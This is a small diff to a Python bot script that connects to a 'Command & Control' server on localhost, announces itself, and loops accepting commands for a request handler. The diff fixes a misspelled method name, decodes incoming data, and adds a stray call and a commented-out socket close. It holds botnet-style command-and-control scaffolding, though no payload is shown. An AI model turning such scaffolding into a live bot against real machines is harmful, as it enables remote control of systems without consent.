@@ -3,7 +3,7 @@ import socket
 import json
 import atexit
 
-
+# TODO implementare con httpservere e base request handler
 class Bot:
 
     def __init__(self, cnc_addr, cnc_port):
@@ -21,12 +21,13 @@ class Bot:
             response = requests.get(url)
             print(f"Response status code: {response.status_code}")
 
-    def deamon(self):
+    def daemon(self):
         while True:
             client, address = self.socket.accept()
             request = client.recv(1024)
-            self.request_handler(request)
-            client.close()
+            self.request_handler(request.decode('utf-8'))
+            requests.Response()
+            # client.close()
 
 
 
@@ -48,4 +49,4 @@ if __name__ == '__main__':
         s.send(b"new")
         print("Connected to the Command & Control")
     bot = Bot("127.0.0.1", 80)
-    bot.deamon()
+    bot.daemon()
